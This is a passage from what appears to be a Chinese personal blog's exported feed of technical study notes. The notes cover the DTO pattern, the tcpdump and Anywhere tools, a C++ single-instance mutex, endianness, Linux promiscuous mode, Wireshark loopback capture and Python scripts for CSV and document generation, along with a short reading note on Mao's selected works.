        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>DTO模式学习</title>
    <url>/2024/04/11/DTO%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>DTO模式首次被提出来是在 Martin Fowler 的 EAA 一书中，DTOs 或 Data Transfer Objects 是一种在进程中传递数据的对象，用来减少方法的调用。</p>
<p>根据 Martin Fowler 的解释，该模式的主要目的是通过在一次调用中批量处理多个命令参数，从而减少请求服务器的次数，进而减少远程操作的网络开销。</p>
<p>该模式的另一个好处是对序列化的逻辑（序列化是指将对象的结构和数据转换为特定模式用来存储或者传输的机制）进行了封装，提供了单一的变化点去修改序列化的逻辑。它还可以将领域模型与表现层解耦，允许两者独立变化而不互相影响。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.baeldung.com/java-dto-pattern" target="_blank" rel="noopener">The DTO Pattern (Data Transfer Object)</a>,by baeldung.</li>
<li><a href="https://iyichen.xyz/2022/04/the-dto-pattern/" target="_blank" rel="noopener">[译] DTO模式</a>,by iyichen.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs静态文件服务器Anywhere使用帮助</title>
    <url>/2024/04/20/nodejs%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8Anywhere%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>Anywhere 是随启随用的静态文件服务器，它能随时随地将你的当前目录变成一个静态文件服务器的根目录。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install anywhere -g</span><br></pre></td></tr></table></figure>

<h1 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h1><p>切换到静态文件目录，输入以下命令测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ anywhere</span><br><span class="line">&#x2F;&#x2F; or with port</span><br><span class="line">$ anywhere -p 8000</span><br><span class="line">&#x2F;&#x2F; or start it but silent(don&#39;t open browser)</span><br><span class="line">$ anywhere -s</span><br><span class="line">&#x2F;&#x2F; or with hostname</span><br><span class="line">$ anywhere -h localhost -p 8888</span><br><span class="line">&#x2F;&#x2F; or with folder</span><br><span class="line">$ anywhere -d ~&#x2F;git&#x2F;anywhere</span><br><span class="line">&#x2F;&#x2F; or enable html5 history</span><br><span class="line">$ anywhere -f &#x2F;index.html</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.npmjs.com/package/anywhere" target="_blank" rel="noopener">anywhere</a>,by npmjs</li>
<li><a href="https://www.jianshu.com/p/3f0b7ea9df53" target="_blank" rel="noopener">nodejs服务器Anywhere使用</a>,by 一包.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcpdump使用帮助</title>
    <url>/2024/04/24/Tcpdump%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>tcpdump 用于收集有关网络流量数据的出色工具。 数据包捕获为故障排除和安全分析提供了有用的信息。</p>
<h1 id="tcpdump-参数"><a href="#tcpdump-参数" class="headerlink" title="tcpdump 参数"></a>tcpdump 参数</h1><table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>将网络地址和广播地址转变成名字</td>
</tr>
<tr>
<td>-c</td>
<td>在收到指定的包的数目后，tcpdump就会停止；</td>
</tr>
<tr>
<td>-d</td>
<td>将匹配信息包的代码以人们能够理解的汇编格式给出；以可阅读的格式输出。</td>
</tr>
<tr>
<td>-dd</td>
<td>将匹配信息包的代码以c语言程序段的格式给出；</td>
</tr>
<tr>
<td>-ddd</td>
<td>将匹配信息包的代码以十进制的形式给出；</td>
</tr>
<tr>
<td>-e</td>
<td>在输出行打印出数据链路层的头部信息；</td>
</tr>
<tr>
<td>-f</td>
<td>将外部的Internet地址以数字的形式打印出来；</td>
</tr>
<tr>
<td>-l</td>
<td>使标准输出变为缓冲行形式；</td>
</tr>
<tr>
<td>-n</td>
<td>直接显示IP地址，不显示名称；</td>
</tr>
<tr>
<td>-nn</td>
<td>端口名称显示为数字形式，不显示名称；</td>
</tr>
<tr>
<td>-t</td>
<td>在输出的每一行不打印时间戳；</td>
</tr>
<tr>
<td>-v</td>
<td>输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息；</td>
</tr>
<tr>
<td>-vv</td>
<td>输出详细的报文信息；</td>
</tr>
<tr>
<td>-F</td>
<td>从指定的文件中读取表达式,忽略其它的表达式；</td>
</tr>
<tr>
<td>-i</td>
<td>指定监听的网络接口；</td>
</tr>
<tr>
<td>-r</td>
<td>从指定的文件中读取包(这些包一般通过-w选项产生)；</td>
</tr>
<tr>
<td>-w</td>
<td>直接将包写入文件中，并不分析和打印出来；</td>
</tr>
<tr>
<td>-T</td>
<td>将监听到的包直接解释为指定的类型的报文，常见的类型有rpc （远程过程调用）和snmp（简单 网络管理协议；）</td>
</tr>
</tbody></table>
<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><h2 id="截获主机收到和发出的所有数据包"><a href="#截获主机收到和发出的所有数据包" class="headerlink" title="截获主机收到和发出的所有数据包"></a>截获主机收到和发出的所有数据包</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump</span><br></pre></td></tr></table></figure>

<h2 id="将抓包信息写入文件-w"><a href="#将抓包信息写入文件-w" class="headerlink" title="将抓包信息写入文件 -w"></a>将抓包信息写入文件 -w</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -w tcpdump_test.pcap</span><br></pre></td></tr></table></figure>

<p>导出的pcap文件可导入wireshark进行分析。</p>
<h2 id="打印出所有可工作的接口-D"><a href="#打印出所有可工作的接口-D" class="headerlink" title="打印出所有可工作的接口 -D"></a>打印出所有可工作的接口 -D</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -D</span><br></pre></td></tr></table></figure>

<h2 id="指定监控的网卡-i"><a href="#指定监控的网卡-i" class="headerlink" title="指定监控的网卡 -i"></a>指定监控的网卡 -i</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/august5291/article/details/121015216" target="_blank" rel="noopener">肝了三天，整了一份全网最全(中文) tcpdump 抓包指南</a>,by 游戏大爷君.</li>
<li><a href="https://blog.csdn.net/ybhuangfugui/article/details/119745385" target="_blank" rel="noopener">网络/命令行抓包工具tcpdump详解</a>,by 一口Linux.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>毛泽东选集全四卷读书笔记</title>
    <url>/2024/04/28/%E6%AF%9B%E6%B3%BD%E4%B8%9C%E9%80%89%E9%9B%86%E5%85%A8%E5%9B%9B%E5%8D%B7%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>如果没有毛泽东同志多次从危机中挽救中国革命，如果没有以他为首的党中央给全党、全国各族人民和人民军队指明坚定正确的政治方向，我们党和人民可能还要在黑暗中摸索更长时间。同中国共产党被公认为全国各族人民的领导核心一样，毛泽东同志被公认为中国共产党和中国各族人民的伟大领袖，在党和人民集体奋斗中产生的毛泽东思想被公认为党的指导思想，这是中华人民共和国建国以前二十八年历史发展的必然结果。</p>
</blockquote>
<h1 id="金句摘抄"><a href="#金句摘抄" class="headerlink" title="金句摘抄"></a>金句摘抄</h1><blockquote>
<p>政治路线确定之后，干部就是决定的因素。【《毛泽东选集》第2卷，人民出版社1991年第2版，中国共产党在民族战争中的地位，第526页。】</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://deyu.usst.edu.cn/2016/0304/c4731a79131/page.htm" target="_blank" rel="noopener">毛泽东选集[全四卷]</a>,by usst.</li>
<li><a href="https://www.gov.cn/test/2008-06/23/content_1024934.htm" target="_blank" rel="noopener">关于建国以来党的若干历史问题的决议</a>,by 人民日报.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之让程序只启动一个实例</title>
    <url>/2024/05/07/CPlusPlus%E4%B9%8B%E8%AE%A9%E7%A8%8B%E5%BA%8F%E5%8F%AA%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<p>C++中让程序只启动一个实例的方法主要有以下几种：</p>
<h1 id="互斥体实现方式"><a href="#互斥体实现方式" class="headerlink" title="互斥体实现方式"></a>互斥体实现方式</h1><p>主要利用如下函数实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数原型：</span><br><span class="line">HANDLE CreateMutex(   </span><br><span class="line">  LPSECURITY_ATTRIBUTES lpMutexAttributes,&#x2F;&#x2F;必须为NULL</span><br><span class="line">  BOOL bInitialOwner, &#x2F;&#x2F;表示mutex的范围是本线程还是全系统</span><br><span class="line">  LPCTSTR lpName  &#x2F;&#x2F;互斥量的名字</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool    checkMyselfExist()&#x2F;&#x2F;如果程序已经有一个在运行，则返回true</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE  hMutex &#x3D; CreateMutex(NULL, FALSE, L&quot;DevState&quot;);</span><br><span class="line">    if (hMutex &amp;&amp; (GetLastError() &#x3D;&#x3D; ERROR_ALREADY_EXISTS))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hMutex);</span><br><span class="line">        hMutex &#x3D; NULL;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (checkMyselfExist())&#123;</span><br><span class="line">        cout &lt;&lt; &quot;program has been runnin&quot; &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        cout &lt;&lt; &quot;start running&quot; &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/PeterZ1997/p/10452688.html" target="_blank" rel="noopener">C++实现程序单实例运行的两种方式</a>,by 倚剑问天.</li>
<li><a href="https://blog.csdn.net/cgb0210/article/details/5800949" target="_blank" rel="noopener">C / C++ 如何让程序只启动一个实例</a>,by C你.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>从数据可视化角度理解大小端字节序问题</title>
    <url>/2024/05/11/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3%E5%A4%A7%E5%B0%8F%E7%AB%AF%E5%AD%97%E8%8A%82%E5%BA%8F%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>大小端字节序问题让人十分头疼，死记硬背并不能加深对大小端字节序的理解。但是从数据可视化的角度，就能理解大小端字节序，让人豁然开朗。</p>
<h1 id="问题来源"><a href="#问题来源" class="headerlink" title="问题来源"></a>问题来源</h1><blockquote>
<p>字节序，又称端序或尾序（英语中用单词：Endianness 表示），在计算机领域中，指电脑内存中或在数字通信链路中，占用多个字节的数据的字节排列顺序。</p>
</blockquote>
<p>字节的排列方式有两个通用规则:</p>
<ul>
<li>大端序（Big-Endian）将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址。这种排列方式与数据用字节表示时的书写顺序一致，符合人类的阅读习惯。</li>
<li>小端序（Little-Endian），将一个多位数的低位放在较小的地址处，高位放在较大的地址处，则称小端序。小端序与人类的阅读习惯相反，但更符合计算机读取内存的方式，因为CPU读取内存中的数据时，是从低地址向高地址方向进行读取的。</li>
</ul>
<p>通常在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序。</p>
<h1 id="从网络数据可视化看大端序"><a href="#从网络数据可视化看大端序" class="headerlink" title="从网络数据可视化看大端序"></a>从网络数据可视化看大端序</h1><blockquote>
<p>一般网络字节序为大端字节序，因为UDP/TCP/IP协议规定：把接收到的第一个字节当作高位字节看待，网络数据解析时先收到的数据存放于低地址，否则内存的访问将是不连续的。 所以，大端字节序 = 网络字节序 = 高位放低地址。</p>
</blockquote>
<p>对于整形数0x11223344，采用网络传输时，从wireshark中抓到的消息包，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0000   11 22 33 44 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0020   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0030   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>从wireshark的数据可视化角度可知，网络通信采用大端序，低地址存储高位字节，高地址存储低位字节，符合人类阅读习惯。</p>
<h1 id="从内存分布可视化看小端序"><a href="#从内存分布可视化看小端序" class="headerlink" title="从内存分布可视化看小端序"></a>从内存分布可视化看小端序</h1><h2 id="操作系统内存布局"><a href="#操作系统内存布局" class="headerlink" title="操作系统内存布局"></a>操作系统内存布局</h2><p>Windows在默认情况下会将高地址的2GB空间分配给内核（也可以配置为1GB），而Linux默认情况下会将高地址的1GB空间分配给内核。也就是说，应用程序只能使用剩下的2GB或3GB的地址空间，称为用户空间（User Space）。</p>
<p align="center">
    <img src="https://img-blog.csdnimg.cn/20190812101410629.png" width="90%" alt="Windows 32位程序的内存分布"/>
</p>
<center>图1  Windows 32位程序的内存分布</center>

<h2 id="应用程序性用户空间布局"><a href="#应用程序性用户空间布局" class="headerlink" title="应用程序性用户空间布局"></a>应用程序性用户空间布局</h2><ul>
<li>堆（heap）的增长方向是向上增长，即低地址向高地址增长。</li>
<li>栈（stack）的增长方向是向下增长，即高地址向低地址增长。</li>
</ul>
<p align="center">
    <img src="https://static.mianbaoban-assets.eet-china.com/xinyu-images/MBXY-CR-f27104926b3e43b7b7d5a856d5ff4717.png" width="90%" alt="Windows 32位程序的内存分布"/>
</p>
<center>图2  Windows 32位程序堆栈内存分配和增长方向</center>

<p>应用程序中定义的变量通常在栈区存储，而栈（stack）的增长方向是向下增长，即高地址向低地址增长。因此，从如下可视化角度查看数据是合理的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        F  E  D  C  B  A  9  8  7  6  5  4  3  2  1  0</span><br><span class="line">0030   11 22 33 44 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0020   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/352145413" target="_blank" rel="noopener">什么是大端序和小端序，为什么要有字节序？</a>,by Kevin Yan.</li>
<li><a href="https://www.cnblogs.com/zjuhaohaoxuexi/p/16210800.html" target="_blank" rel="noopener">Windows下C语言程序的内存布局</a>,by 朴素贝叶斯.</li>
<li><a href="https://blog.csdn.net/m0_74282605/article/details/128726145" target="_blank" rel="noopener">一文弄懂大小端字节序/网络字节序</a>,by Linux加油站.</li>
<li><a href="https://www.eet-china.com/mp/a182771.html" target="_blank" rel="noopener">为什么堆和栈的增长方向相反？</a>,by 嵌入式ARM.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux网口混杂模式设置方法</title>
    <url>/2024/05/18/Linux%E7%BD%91%E5%8F%A3%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近在Kylin 4.0.4社区版上安装了VirtualBox，使用VirtualBox安装了Win7操作系统，虚拟机通过设置网口桥接模式与宿主机进行通信。偶尔出现宿主机无法ping通虚拟机，虚拟机无法ping通宿主机的情况，查看虚拟机网口接收情况，发现虚拟机接收数据包为0，重启虚拟机也无法恢复，因此严重怀疑其原因是虚拟机使用的宿主机网口工作模式并不是混杂模式。下面介绍在Linux上查看网口工作模式和设置网口工作模式的方法。</p>
<h1 id="查看网口工作模式"><a href="#查看网口工作模式" class="headerlink" title="查看网口工作模式"></a>查看网口工作模式</h1><p>如果存在ifconfig命令，则可使用该命令查看网口的工作模式，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost jack]# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:70:1D:79  </span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe70:1d79&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:100124 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:8795 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:12986638 (12.3 MiB)  TX bytes:6452270 (6.1 MiB)</span><br></pre></td></tr></table></figure>

<p>如果存在ip命令，则可使用该命令查看网口的工作模式，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost jack]# ip addr</span><br></pre></td></tr></table></figure>

<h1 id="设置网口工作模式"><a href="#设置网口工作模式" class="headerlink" title="设置网口工作模式"></a>设置网口工作模式</h1><p>如果存在ifconfig命令，则可使用该命令设置网口的工作模式，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 promisc  设置混杂模式</span><br><span class="line">ifconfig eth0 -promisc 取消混杂模式</span><br></pre></td></tr></table></figure>

<p>如果存在ip命令，则可使用该命令设置网口的工作模式，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip link set eth0 up</span><br><span class="line">ip link set eth0 promisc on</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.splaybow.com/post/linux-wangka-hunza-moshi.html" target="_blank" rel="noopener">Linux中如何将网卡设置为混杂模式</a>,by splaybow.</li>
<li><a href="https://blog.csdn.net/dkfajsldfsdfsd/article/details/79409799" target="_blank" rel="noopener">VirtualBox网络之桥接网卡</a>,by 五星上炕.</li>
<li><a href="https://blog.csdn.net/duyiwuer2009/article/details/26757271" target="_blank" rel="noopener">设置网卡混杂模式</a>,by duyiwuer2009.</li>
<li><a href="https://www.jianshu.com/p/315d1b60501a" target="_blank" rel="noopener">Linux下的ip命令</a>,by wyaoo.</li>
<li><a href="https://blog.csdn.net/bandaoyu/article/details/134523501" target="_blank" rel="noopener">【网络】网口工作模式（混杂模式|监听模式|监视模式|管理模式）</a>,by bandaoyu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark回环地址抓包问题</title>
    <url>/2024/05/22/Wireshark%E5%9B%9E%E7%8E%AF%E5%9C%B0%E5%9D%80%E6%8A%93%E5%8C%85%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>通过套接字发送本地的数据包不会通过真实的网络接口发送，而是通过回环地址。因此，如果需要分析发往本机的网络数据包，需要Wireshark在回环地址上抓包。</p>
<h1 id="关键的Npcap程序"><a href="#关键的Npcap程序" class="headerlink" title="关键的Npcap程序"></a>关键的Npcap程序</h1><p>windows系统没有提供本地回环网络的接口，用wireshark监控网络的话只能看到经过网卡的流量，看不到访问localhost的流量，因为wireshark在windows系统上默认使用的是WinPcap来抓包的，现在可以用Npcap来替换掉WinPcap，Npcap是基于WinPcap 4.1.3开发的，api兼容WinPcap。</p>
<p>Npcap 是 Nmap 项目的 Microsoft Windows 数据包捕获（和发送）库。它使用自定义 Windows 内核驱动程序以及我们的 Windows 版本的优秀 libpcap 库来实现开放Pcap API。这允许 Windows 软件使用简单、可移植的 API 捕获原始网络流量（包括无线网络、有线以太网、本地主机流量和许多 VPN）。 Npcap 现在提供：</p>
<ul>
<li>环回数据包捕获和注入</li>
<li>支持所有当前 Windows 版本</li>
<li>Libpcap API</li>
<li>支持所有 Windows 架构（x86、x86-64 和 ARM）</li>
<li>额外的安全性</li>
<li>WinPcap 兼容性</li>
<li>原始（监控模式）802.11 无线捕获</li>
</ul>
<h1 id="Wireshark安装注意事项"><a href="#Wireshark安装注意事项" class="headerlink" title="Wireshark安装注意事项"></a>Wireshark安装注意事项</h1><p>安装Wireshark 3.4.4时，其安装包内置了Npcap的安装程序，但是安装时需要注意<strong>需勾选兼容WinPcap选项，否则Wireshark将找不到Adapter for loopback traffic capture网口</strong>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/zengliguang/article/details/135383323" target="_blank" rel="noopener">Wireshark本地回环网络抓包</a>,by 三希.</li>
<li><a href="https://blog.csdn.net/finghting321/article/details/105510264" target="_blank" rel="noopener">Wireshark之本地回环抓包</a>,by Word哥.</li>
<li><a href="https://npcap.com/" target="_blank" rel="noopener">Npcap: Packet capture library for Windows</a>,by npcap.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Python提取csv文件中的特定列的方法</title>
    <url>/2024/05/24/Python%E6%8F%90%E5%8F%96csv%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%89%B9%E5%AE%9A%E5%88%97%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近需要抽取csv文件中的特定列，使用excel老是将hh.mm.ss.SSS格式数据搞坏，于是想通过python直接提取。方法记录如下：</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="Pandas介绍"><a href="#Pandas介绍" class="headerlink" title="Pandas介绍"></a>Pandas介绍</h2><p>Pandas是用于数据操纵和分析的Python软件库。它建造在NumPy基础上，并为操纵数值表格和时间序列，提供了数据结构和运算操作。</p>
<h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><ul>
<li>python 3.8.5，可在windows7上运行，python 3.9以后版本不支持windows7</li>
<li>numpy==1.24.4</li>
<li>pandas==2.0.3</li>
<li>python-dateutil==2.9.0.post0</li>
<li>pytz==2024.1</li>
<li>six==1.16.0</li>
<li>tzdata==2024.1</li>
</ul>
<h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir csv_extract</span><br><span class="line">cd csv_extract</span><br><span class="line">python -m venv env</span><br><span class="line">env\Scripts\activate.bat</span><br><span class="line">pip install pandas</span><br><span class="line">pip freeze &gt; requirement.txt</span><br><span class="line">pip download -d packages -r requirement.txt</span><br></pre></td></tr></table></figure>

<h2 id="离线迁移"><a href="#离线迁移" class="headerlink" title="离线迁移"></a>离线迁移</h2><p>创建envConfig.bat批处理文件，一键执行离线环境配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m venv env</span><br><span class="line">call env\Scripts\activate.bat</span><br><span class="line">pip install --no-index --find-links&#x3D;packages -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def walk_files(src_filepath &#x3D; &quot;.&quot;):</span><br><span class="line">    filepath_list &#x3D; []</span><br><span class="line">   </span><br><span class="line">    for root, dirs, files in os.walk(src_filepath):</span><br><span class="line">        for file in files:</span><br><span class="line">            if root &#x3D;&#x3D; &#39;.&#39;:</span><br><span class="line">                root_path &#x3D; os.getcwd() + &quot;&#x2F;&quot;</span><br><span class="line">            else:</span><br><span class="line">                root_path &#x3D; root</span><br><span class="line">            </span><br><span class="line">            if (root_path !&#x3D; src_filepath) and (root !&#x3D; &#39;.&#39;):</span><br><span class="line">                filepath &#x3D; root_path + &quot;&#x2F;&quot; + file</span><br><span class="line">            else:</span><br><span class="line">                filepath &#x3D; root_path + file</span><br><span class="line">            </span><br><span class="line">            if filepath not in filepath_list:</span><br><span class="line">                filepath_list.append(filepath)</span><br><span class="line">                       </span><br><span class="line">    return filepath_list</span><br><span class="line"></span><br><span class="line">def extract_csv(filepath,usecols&#x3D;[0,3,11,42,43],encoding&#x3D;&#39;gbk&#39;):</span><br><span class="line">    df &#x3D; pd.read_csv(filepath,usecols&#x3D;usecols,encoding&#x3D;encoding)</span><br><span class="line">    df.to_csv(filepath+&#39;.csv&#39;,index&#x3D;0)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print(os.getcwd())</span><br><span class="line"></span><br><span class="line">    search_dir&#x3D;&#39;.&#x2F;testData&#x2F;&#39;</span><br><span class="line">    file_info_list &#x3D; walk_files(search_dir) </span><br><span class="line">    </span><br><span class="line">    for file in file_info_list:</span><br><span class="line">        print(file)</span><br><span class="line">        extract_csv(file)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://pandas.pydata.org/" target="_blank" rel="noopener">pandas</a>,by pandas.</li>
<li><a href="https://medium.com/@sabahat-khan/how-to-recursively-traverse-files-and-directories-in-python-6020155713fa" target="_blank" rel="noopener">How to Recursively Traverse Files and Directories in Python</a>,by Sabahat Khan.</li>
<li><a href="https://blog.csdn.net/wuzhongqiang/article/details/118332777" target="_blank" rel="noopener">Pandas读取CSV的时候报错文件不存在的经验小记</a>,by 翻滚的小@强.</li>
<li><a href="https://www.runoob.com/python/os-walk.html" target="_blank" rel="noopener">Python os.walk() 方法</a>,by runoob.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python提取数据库内容并根据文档模板生成文档的方法</title>
    <url>/2024/06/08/Python%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9%E5%B9%B6%E6%A0%B9%E6%8D%AE%E6%96%87%E6%A1%A3%E6%A8%A1%E6%9D%BF%E7%94%9F%E6%88%90%E6%96%87%E6%A1%A3%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近需要从Oracle数据库中提取一些数据，并使用文档模板生成文档，鉴于Python环境部署的方便性，编程的简便性，于是采用Python开发该程序。方法记录如下：</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><p>核心是 docxtpl 和 oracledb 两个库。</p>
<ul>
<li>python 3.8.5，可在windows7上运行，python 3.9以后版本不支持windows7</li>
<li>Babel==2.15.0</li>
<li>cffi==1.16.0</li>
<li>cryptography==42.0.8</li>
<li>docxcompose==1.4.0</li>
<li>docxtpl==0.17.0</li>
<li>jinja2==3.1.4</li>
<li>lxml==5.2.2</li>
<li>MarkupSafe==2.1.5</li>
<li>numpy==1.24.4</li>
<li>oracledb==2.2.1</li>
<li>pandas==2.0.3</li>
<li>pycparser==2.22</li>
<li>python-dateutil==2.9.0.post0</li>
<li>python-docx==1.1.2</li>
<li>pytz==2024.1</li>
<li>six==1.16.0</li>
<li>typing-extensions==4.12.2</li>
<li>tzdata==2024.1</li>
</ul>
<h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir wordtpl_generate</span><br><span class="line">cd wordtpl_generate</span><br><span class="line">python -m venv env</span><br><span class="line">env\Scripts\activate.bat</span><br><span class="line">pip install pandas</span><br><span class="line">pip freeze &gt; requirement.txt</span><br><span class="line">pip download -d packages -r requirement.txt</span><br></pre></td></tr></table></figure>

